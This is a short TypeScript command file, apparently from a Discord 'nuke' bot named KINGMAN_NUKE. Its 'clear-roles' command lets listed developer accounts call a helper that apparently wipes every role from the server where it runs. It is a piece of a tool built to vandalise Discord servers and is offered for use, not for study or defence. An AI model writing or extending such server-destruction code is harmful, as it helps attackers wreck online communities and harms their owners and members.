import { Command } from '../../KINGMAN_NUKE/types/KING-NUKE';
export default {
    name: "clear-roles",
    description: "",
    run: async(client, kmsg, args, kingman)=> {
        if(!client.config.devs.includes(kmsg.author.id)) return;
        if(!kmsg.guild) return;
        await kingman.clearRoles(kmsg.guild).catch(e=> {
            console.log(e)
        })
    } 
} as Command